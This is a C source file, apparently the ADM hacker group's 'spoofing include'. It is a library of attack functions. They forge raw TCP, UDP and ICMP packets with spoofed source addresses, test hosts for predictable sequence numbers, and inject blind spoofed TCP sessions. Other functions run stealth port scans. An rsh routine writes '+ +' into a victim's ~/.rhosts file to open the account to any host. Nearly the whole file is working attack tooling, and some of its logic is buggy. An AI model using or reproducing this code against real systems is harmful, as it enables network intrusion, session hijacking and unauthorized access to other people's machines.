/************************************************************************/
/*  ADM spoofing include  ver 1.4.2                                     */
/************************************************************************/
/*  NEWS: yo i have erased a FUCKING BIG BUG in Sconnect ! :) now  she  */
/*  work very nicely :), i have erased all warning msg  :)     So ..    */
/*  WoRK BeTTer  ;)							*/ 
/************************************************************************/
/*                         The  ADM Crew                                */
/************************************************************************/
/* Greetz:  ALL the ADM CreW ! , Fractalg , Fr4wd , FatZU ,pmsac,EDevil */
/* Groups Greetz: Toxyn							*/
/* Codeur Greetz: nobody =]						*/
/* Personal Greetz: Heike "Yam i'm in HeikeCoRe"			*/
/************************************************************************/
/*                  EnJoY AdM SOurceZzzzZzz                             */  
/************************************************************************/

  
#define IPHDRSIZE   sizeof(struct iphdr  )
#define ICMPHDRSIZE sizeof(struct icmphdr)
#define TCPHDRSIZE  sizeof(struct tcphdr )
#define PSEUDOHDRSIZE sizeof(struct pseudohdr)
#define UDPHDRSIZE   sizeof(struct udphdr)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_tcp.h>
#include <netinet/udp.h>

/*****************************************************************************/
/* structure of the pseudo header                                            */
/*****************************************************************************/

 struct pseudohdr{
  unsigned long saddr;
  unsigned long daddr;
  char     useless;
  unsigned char protocol;
  unsigned int leng;
   };
struct nnn{
u_long ip;
}myip;
                                                                
struct s_hdr{
__u32 s_ack:32;
__u32 s_seq:32;
__u32 s_da_ip:32;
__u32 s_ip:32;
__u16 s_sport:16;
__u16 s_dport:16;
}spoof_hdr;



#ifdef SYSV
#define bcopy(s1,s2,len) memcpy(s2,s1,len)
#endif

/*****************************************************************************/
/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */
/*****************************************************************************/

unsigned short in_cksum(addr, len)
    u_short *addr;
    int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return(answer);
}

 
/****************************************************************************/
/*                  SEND A PAKET TCP !                                      */
/*
 
 usage: send_pkt(socket , ip of source , ip of dest , source port, dest port,
                 flags, seq_num, ack_num, window size , *data , size of data); 
                                                                            */
/****************************************************************************/                  


send_pkt(int s,
        unsigned long s_ip,
        unsigned long d_ip,
        unsigned int  s_port,
        unsigned int  d_port,
        unsigned char flags,
        unsigned long seq_num,
        unsigned long ack_num,
        unsigned int  winsize,
        unsigned char *data,
        unsigned int  data_size 
        )

{
   struct   sockaddr_in sin_dst;
   struct   iphdr       *ip;
   struct   tcphdr      *tcp;
   struct   pseudohdr   *pseudo;
   unsigned char        *DATA;
   unsigned char        packet[2048];
   
   ip     = (struct iphdr      *)packet;
   pseudo = ( struct pseudohdr *)(packet+IPHDRSIZE-PSEUDOHDRSIZE);
   tcp    = (struct tcphdr     *)(packet+IPHDRSIZE);
   DATA   = (unsigned char     *)(packet+IPHDRSIZE+TCPHDRSIZE);
   
   memset(packet,0,2048);                     
   memcpy(DATA,data,data_size);                                 
                                                 
	 pseudo->saddr = s_ip;
	 pseudo->daddr = d_ip;
	 pseudo->useless = 0;
	 pseudo->protocol = 6;
         pseudo->leng = htons(TCPHDRSIZE+data_size);
	                         
	tcp->th_sport=htons(s_port);
	tcp->th_seq=htonl(seq_num);
	tcp->th_ack=htonl(ack_num);
	tcp->th_off=5;
	tcp->th_flags=flags;
	tcp->th_win=htons(winsize);
	
	tcp->th_urp=0;     
        tcp->th_dport=htons(d_port );
        tcp->th_sum=0;
        tcp->th_sum=in_cksum(pseudo,TCPHDRSIZE+PSEUDOHDRSIZE+data_size);
                 
        memset(packet,0,IPHDRSIZE);
            
        ip->saddr    =  s_ip;
	ip->daddr    =  d_ip;
	ip->version  = 4;
	ip->ihl      = 5; 
	ip->ttl      = 245;
	ip->protocol = 6; 
	ip->tot_len  = htons(IPHDRSIZE+TCPHDRSIZE+data_size);
	ip->tos      = 0;
	ip->id       = random()%1256;
	ip->frag_off = 0;
	ip->check    = 0;
	ip->check    = in_cksum(packet,IPHDRSIZE);
        	
        sin_dst.sin_addr.s_addr = ip->daddr;
        sin_dst.sin_family = AF_INET;     
        
	sendto(s,packet,IPHDRSIZE+TCPHDRSIZE+data_size,0,
        (struct sockaddr *)&sin_dst,sizeof(struct sockaddr)); 
       	

}


/*****************************************************************************/
/*                       SEND A UDP PACKET                                   */
/* usage: udp_send( socket, addr of source , addr of dest, port source ,     */
/*         port of dest, *data , size of data);                              */
/*****************************************************************************/

 int udp_send(int s,
                      unsigned long  s_addr,
                      unsigned long  d_addr,
                      unsigned short s_port,
                      unsigned short d_port,
                      char           *datagram,
                      unsigned       datasize)
{

struct sockaddr_in sin;
struct iphdr     *ip;
struct pseudohdr *pseudo;
struct udphdr    *udp;
unsigned char    *data;
unsigned char packet[1024];
 

  ip     = (struct iphdr     *)packet;
  pseudo = (struct pseudohdr *)(packet+IPHDRSIZE-PSEUDOHDRSIZE);
  udp    = (struct udphdr    *)(packet+IPHDRSIZE);
  data   = (unsigned char    *)(packet+IPHDRSIZE+UDPHDRSIZE);
       
memset(packet,0,1024);

        pseudo->saddr=s_addr;
        pseudo->daddr=d_addr;
        pseudo->useless=0;
        pseudo->protocol=17;
        pseudo->leng=htons(UDPHDRSIZE+datasize);
         	
	udp->source  = htons(s_port); 
	udp->dest    = htons(d_port);
	udp->len     = htons(UDPHDRSIZE+datasize);
	memcpy(data,datagram,datasize);
	udp->check    = 0;         
	udp->check   = in_cksum(pseudo+PSEUDOHDRSIZE+UDPHDRSIZE+datasize);
        memcpy(data,datagram,datasize);
        
        memset(packet,0,IPHDRSIZE);
        
        ip->saddr    = s_addr;
        ip->daddr    = d_addr;
        ip->version  = 4;
        ip->ihl      = 5;
        ip->ttl      = 255;
        ip->id       = random()%5985;
        ip->protocol = 17;
        ip->tot_len  = htons(IPHDRSIZE + UDPHDRSIZE+ datasize);
        ip->check    = 0;
        ip->check    = in_cksum((char *)packet,IPHDRSIZE);
                                                                        
                                                                        

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=d_addr;
	sin.sin_port=udp->dest;

         sendto(s, packet, IPHDRSIZE+UDPHDRSIZE+datasize, 0, 
        		(struct sockaddr*)&sin, sizeof(struct sockaddr));

}


/****************************************************************************/
/*                     SEND A ICMP PACKET                                   */
/*    hehe ripped from ADMscan2 :)                                          */
/****************************************************************************/
/* IN TEST !!!!!!!

int icmp_echo(int s,unsigned long int src, unsigned long int dest,int id,int seq,
		char* data, unsigned int datasize) 
{
struct iphdr   *ip;
struct icmphdr *icmp;
unsigned char *icmpdata;
unsigned char *packet;
struct sockaddr_in sin_dst;
int n;

	packet=(char*)malloc(IPHDRSIZE +ICMPHDRSIZE+datasize+1);
	if (packet==NULL) {
		puts("malloc error");
		return -1;
	}
	ip = (struct iphdr *)packet;
	icmp = (struct icmphdr *)(packet+IPHDRSIZE);
	icmpdata = (char *)(packet+IPHDRSIZE+ICMPHDRSIZE);

	ip->saddr    = src;
	ip->daddr    = dest;
	ip->version  = 4;
	ip->ihl      = 5;
	ip->ttl      = 255;
	ip->protocol = 1;
	ip->tot_len  = htons(IPHDRSIZE +ICMPHDRSIZE+datasize);
	ip->tos      = 0;
	ip->id       = 0;
	ip->frag_off = 0;
	ip->check    = 0;
	ip->check    = in_cksum(ip,IPHDRSIZE);

	icmp->type   = 8;
	icmp->code   = 0;
	icmp->checksum = 0;
	icmp->un.echo.id  = id;
	icmp->un.echo.sequence = seq;
	memcpy(icmpdata,data,datasize);
	icmp->checksum = in_cksum(icmp,ICMPHDRSIZE+datasize);

	sin_dst.sin_addr.s_addr = ip->daddr;
	sin_dst.sin_family = AF_INET;

	n=sendto(s,packet,IPHDRSIZE+ICMPHDRSIZE+datasize,0,
		(struct sockaddr*)&sin_dst,sizeof(struct sockaddr));
	if (n==-1) puts("sendto error");
	free(packet);

}

*/

/****************************************************************************/
/*                TEST IF  A HOST IS ALIVE                                  */
/*                                                                          */
/****************************************************************************/ 

/*****************************************************************************/
/*                     RECV PAKET                                            */
/* get_pkt(socket, *buffer , size of the buffer);                            */
/*****************************************************************************/
get_pkt(int s,unsigned char *data,int size)
{
struct sockaddr_in sin;
int len,resu;
len= sizeof(sin);
resu=recvfrom(s,data,size,0,(struct sockaddr *)&sin,&len);
return resu;
}        

/*****************************************************************************/
/*                     GET THE SEQ NUMBER                                    */
/*****************************************************************************/

unsigned long get_seq(unsigned long s_ip, unsigned long d_ip,unsigned int  s_port)

{
struct   sockaddr_in  sin;
struct   tcphdr       *tcp;
struct   iphdr        *ip;
unsigned char         data[400];
         int          s,i,s_r,S_port,timeout=0,on=1;
unsigned long         ack_num=0;

ip  = (struct iphdr  *)data;
tcp = (struct tcphdr *)(data+IPHDRSIZE);
memset(data,0,399);
S_port = random()%1000;
s=socket(AF_INET,SOCK_RAW,255);
s_r=socket(AF_INET,SOCK_RAW,6);
ioctl(s_r,FIONBIO,&on);
ioctl(s,FIONBIO,&on);

   
 #ifdef IP_HDRINCL
 setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i));
 #endif 

send_pkt(s,s_ip,d_ip,S_port,s_port,TH_SYN,1234,0,512,NULL,0);

while(timeout<480){

       get_pkt(s_r,data,398);
              
              if(ip->saddr==d_ip){
                if(tcp->th_dport == htons(S_port) ){ 
                   if(tcp->th_sport == htons(s_port)){
                      if(tcp->th_flags & TH_ACK)
                      {                          
                       printf(" SeQ numa Is %lu \n" , ntohl(tcp->th_seq));
                       ack_num=ntohl(tcp->th_seq);
                       break;
                       } 
                     }
                   } 
                 }
          usleep(10000);
          timeout++;
           }
close(s);
close(s_r);
return ack_num;
} 

/*****************************************************************************/
/*                     PORT PROBER                                           */
/* usage:  pprobe(ip of desti , port ,flagz )                                */        
/*****************************************************************************/

pprobe(unsigned long da_ip, 
       unsigned short int port,
       int flagz )
{
struct   sockaddr_in  sin;
struct   tcphdr       *tcp;
struct   iphdr        *ip,*ipr;
unsigned char         data[400];
unsigned char         datar[400];
int          s,i=1,s_r,resu,timeout=0,sicmp,on=1;
ip  = (struct iphdr  *)data;
tcp = (struct tcphdr *)(data+IPHDRSIZE);
ipr = (struct iphdr *)data;

memset(data,0,399);
s=socket(AF_INET,SOCK_RAW,255);
s_r=socket(AF_INET,SOCK_RAW,6);
sicmp=socket(AF_INET,SOCK_RAW,1);
ioctl(s_r,FIONBIO,&on);
ioctl(sicmp,FIONBIO,&on);


         
#ifdef IP_HDRINCL
setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i));
#endif
            

send_pkt(s,myip.ip,da_ip,2669,port,flagz,1234,0,512,NULL,0);
resu = -1;

while(timeout<80){

data[0]='0';
datar[0]='0';
usleep(100000);

timeout = timeout + 1;

get_pkt(s_r,data,399);
get_pkt(sicmp,datar,399);

if(datar[0]!='0')
   {
   resu = -1;
   printf("ICMP!\n");
   goto fin;
   }

if(data[0]!='0'){

       if(ip->saddr==da_ip){
           if(tcp->th_dport == htons(2669) ){
              if(tcp->th_sport == htons(port)){
                resu= (tcp->th_flags |  TH_ACK) ;
                  
                  if(resu==18)resu = 0;    
                  if(resu==20)resu = -1;
                 break;   
               }
             }
         }     
     }
 }

fin:
if(timeout > 79) printf(" Time Out");

close(s);
close(s_r);
close(sicmp);
return resu ;
}          

                                                                               
/****************************************************************************/
/*                       UDP PORT PROBBER                                   */
/* usage: Upprobe( ip of dest , port)                                       */
/****************************************************************************/

Upprobe(unsigned long da_ip, unsigned short int port )

{
struct   sockaddr_in  sin,sin_dst;
struct   icmphdr      *icmp;
struct   iphdr        *ip;
unsigned char         data[400];
int          s,i=1,s_r,resu;
ip  = (struct iphdr  *)data;
icmp = (struct icmphdr*)(data+IPHDRSIZE);
memset(data,0,399);

s=socket(AF_INET,SOCK_DGRAM,17);
ioctl(s,FIONBIO,&i);

sin_dst.sin_family=AF_INET;
sin_dst.sin_port=htons(port);
sin_dst.sin_addr.s_addr = da_ip;
sendto(s,NULL,0,0,(struct sockaddr *)&sin_dst,sizeof(sin_dst));
s_r=socket(AF_INET,SOCK_RAW,1);
i=1;
ioctl(s_r,FIONBIO,&i);
          
resu=-1;  

for(;;){
data[0]='0';
get_pkt(s_r,data,399);
if(data[0]!='0')
{ 
 printf(" ???\n");
    
   if(ip->saddr==da_ip)
   {
     
     if(ip->protocol==1)
     {
        
       resu = 0;     
       goto fin;
     }
     else
        {
        resu = -1;
        }   
        }
  }
}
fin:
return resu;

} 
         
/****************************************************************************/
/*                     MakE A sPOoF ConnEction                              */
/*                                                                          */
/* usage(socket,sourceIP,Destination IP ,port SOurce, port Dest,ipofurhost) */
/****************************************************************************/

Sconnect(int s,
         unsigned long  s_ip,
         unsigned long  d_ip,
         unsigned short int s_port,
         unsigned short int d_port,
         unsigned long   myhost)

{ 

int    loop;
spoof_hdr.s_seq   = 1;
spoof_hdr.s_da_ip = d_ip;
spoof_hdr.s_ip    = s_ip;
spoof_hdr.s_sport = s_port;
spoof_hdr.s_dport = d_port;

spoof_hdr.s_ack = get_seq(myhost,d_ip,d_port);
send_pkt(s,s_ip,d_ip,s_port,d_port,TH_SYN,spoof_hdr.s_seq,1,512,NULL,0);

for(loop=1;loop<6;loop++)
{

spoof_hdr.s_seq=spoof_hdr.s_seq;
printf(" spoof ack +64000*%i+1 =%lu \n",loop,spoof_hdr.s_ack+(64000*loop)+1);
send_pkt(s, s_ip ,d_ip ,s_port,d_port,TH_ACK,spoof_hdr.s_seq+1,spoof_hdr.s_ack+(64000*loop)+1,14360,NULL,0); 
}
spoof_hdr.s_seq=spoof_hdr.s_seq+1;

}
/*****************************************************************************/
/*               Spoofed Write  ( need Sconnect before )                     */
/* usage:  Swrite (socket, *data , sizeofdata );                                    */
/*****************************************************************************/


Swrite(int s, u_char *data, int size )

{
int loop;

for(loop=1;loop<6;loop++)
{
send_pkt(s,spoof_hdr.s_ip,spoof_hdr.s_da_ip ,
           spoof_hdr.s_sport,spoof_hdr.s_dport,
           (TH_PUSH|TH_ACK),spoof_hdr.s_seq,spoof_hdr.s_ack+(64000*loop)+1,
           14360,data,size);
}
spoof_hdr.s_seq=spoof_hdr.s_seq+size;


}   
/****************************************************************************/
/* Spoofed write 2							    */
/* usage: Swrites(s,*data);					            */
/****************************************************************************/
Swrites(int s, char *data)
{
	int size;
	size=strlen(data);
	Swrite(s,data,size);
}
/*****************************************************************************/
/*           Test If a Host Is SPoofable                                     */
/* usage: Stest (myhost,ip dest , port of dest);                             */
/*****************************************************************************/

Stest( unsigned long myhost, unsigned long ip_d , unsigned short  d_port)
{
u_long resu,R;
u_long resu1,R1;
u_long resu2,R2;
u_long resu3,R3;
int done = -1;


resu  = get_seq(myhost,ip_d,d_port);
resu1 = get_seq(myhost,ip_d,d_port);
resu2  = get_seq(myhost,ip_d,d_port);
resu3  = get_seq(myhost,ip_d,d_port);


if(resu1-resu==64000 || resu1-resu == 128000) done=0;

if(resu3-resu2==64000|| resu3-resu2== 128000) done=0;
 
return  done;

}

/****************************************************************************/
/*    get only the IP frome a host -l ouput filez                           */
/* usage: IPFILEZ( *the src filez, *the output filez);                      */
/****************************************************************************/

IPFILEZ(FILE *DA,FILE *trace)
{
char ipz[256];
int oki;

while(!feof(DA))
 {                
   fscanf(DA , "%s", ipz );  
      
    if(strstr(ipz,"u") == 0 || strstr(ipz,"U") ==0 )
      {
             if(strstr(ipz,"y") == 0 ||strstr(ipz,"U") == 0)
                {
                      if(strstr(ipz,"e") == 0 || strstr(ipz,"E") == 0)
                         {
                               if(strstr(ipz,"g") == 0 || strstr(ipz,"G") == 0)
                                 {
                                        if(strstr(ipz,"i") == 0 || strstr(ipz,"I") == 0)  
                                          {
                                                 if(strstr(ipz,"a") == 0|| strstr(ipz,"A") == 0 )
                                                          {
                                                           if(strstr(ipz,"o") == 0 || strstr(ipz,"O") == 0 )oki=1;
                                                           }
                                          }
                                   }
                          }
                 }
          }      
      
      if(oki==1)
        {  
        fprintf( trace , "%s\n" , ipz );
        fflush(trace);
        oki=0;
        }
          
       if(feof(DA))break;
        
    }

 }
 
 /****************************************************************************/
 /*     make a Scan Port on a plage of port                                  */
 /*  Scan2( *int input,int*output,size of *);                                */
 /****************************************************************************/

Scan2(int *ptr,int *outptr,int Size,int flagz , u_long da_ip)
{ 
struct   sockaddr_in  sin;
struct   tcphdr       *tcp,*tcpr;
struct   iphdr        *ip,*ipr;
unsigned char         data[400];
unsigned char         datar[400];

int          s,i=1,s_r,resu,timeout=0,try=0,on=1;
ip  = (struct iphdr  *)data;
tcp = (struct tcphdr *)(data+IPHDRSIZE);
ipr = (struct iphdr *)datar;
tcpr= (struct tcphdr *)(datar+IPHDRSIZE);

memset(outptr,0,(Size/2));
memset(data,0,399);
s=socket(AF_INET,SOCK_RAW,255);
s_r=socket(AF_INET,SOCK_RAW,6);

ioctl(s_r,FIONBIO,&on);



         
#ifdef IP_HDRINCL
setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i));
#endif
            

while(timeout<540){

data[0]='0';
datar[0]='0';
usleep(10000);

timeout = timeout + 1;

if(try<Size)
 {
if(*(ptr+try) != 0)
    { 
send_pkt(s,myip.ip,da_ip,40000-try,*(ptr+try),flagz,1234,0,512,NULL,0);
    }
}

get_pkt(s_r,datar,399);

if(datar[0]!='0'){
  if(ipr->saddr==da_ip){
     if( ntohs(tcpr->th_dport) > 39000 ){   
        resu= (tcpr->th_flags |  TH_ACK) ;
               if(resu==18){
               *(outptr+(40000-ntohs(tcpr->th_dport)))=1;
               printf(" le Port %i repond :)\n",ntohs(tcpr->th_sport));
               resu=0;
               datar[0]='0';
               }
         }     
      }
   } 
try++;
 }   
} 


/****************************************************************************/
/*  Rtest a function for test the permission of R service                   */
/*  Rtest(ip of victim,port);						    */
/****************************************************************************/

Rtest(u_long ip,int port,char *Ruser,char *Luser)
{
struct sockaddr_in adresse_serveur,adresse_client;
char bla[2000];
char cmd[200];
char exe[200] = "echo \" + + \" >> ~/.rhosts";
char *cmdptr;
int socket_client,err;
int longueur=sizeof(struct sockaddr_in);
bzero(bla,2000);
bzero(cmd,200);
cmdptr=cmd;

if(port=514){
	
	socket_client=socket(AF_INET,SOCK_STREAM,6); 
	adresse_client.sin_family=AF_INET;
	adresse_client.sin_addr.s_addr=htonl(INADDR_ANY);
	adresse_client.sin_port=htons(764+1+(100.0*rand()/(RAND_MAX+1.0)) );
        printf(" port %i\n",ntohs(adresse_client.sin_port));
       bind(socket_client,(struct sockaddr *)&adresse_client,longueur);

	adresse_serveur.sin_family=AF_INET;
	adresse_serveur.sin_port=htons(514);
	adresse_serveur.sin_addr.s_addr=ip;

	connect(socket_client,(struct sockaddr *)&adresse_serveur,longueur); 

	send(socket_client,"0\0",2,0);	
	strcat(cmd,Luser);
	send(socket_client,cmd,strlen(Luser)+1,0);
	bzero(cmd,400);
	cmdptr=cmd;
	strcat(cmdptr,Ruser);
	cmdptr=cmdptr+strlen(Ruser)+1;
	strcat(cmdptr,exe);	
	
	send(socket_client,cmd,strlen(Ruser)+strlen(exe)+2,0);
	read(socket_client,bla,200);
        printf("%s\n",bla);
	if(strstr(bla,"nied")){ close(socket_client);err = -1;}
	else err=0;
	close(socket_client);
	
	return (err);
  }
}



/****************************************************************************/
/* Rblast  a function for try the RSH spoofing                              */
/* Rblast(ip trust,ip of victim,ur ip,local user, remote user,ports)        */
/* ya u cant determine ur own comand for this use ADMrsh !                  */
/****************************************************************************/ 



                                                                       